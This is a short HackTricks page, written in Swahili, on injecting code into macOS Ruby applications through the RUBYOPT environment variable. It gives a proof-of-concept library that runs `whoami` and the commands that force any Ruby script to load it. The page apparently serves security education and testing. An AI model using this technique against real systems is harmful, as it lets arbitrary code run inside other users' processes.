# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Kwa kutumia hii env variable inawezekana **kuongeza params mpya** kwa **ruby** kila wakati inatekelezwa. Ingawa param **`-e`** haiwezi kutumika kubaini msimbo wa ruby wa kutekeleza, inawezekana kutumia params **`-I`** na **`-r`** kuongeza folda mpya kwenye maktaba za kupakia na kisha **kubaini maktaba ya kupakia**.

Unda maktaba **`inject.rb`** katika **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Tengeneza popote script ya ruby kama:
```ruby:hello.rb
puts 'Hello, World!'
```
Kisha fanya script ya ruby isiyo na mpangilio iipakue na:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Fahamu ya kufurahisha, inafanya kazi hata na param **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
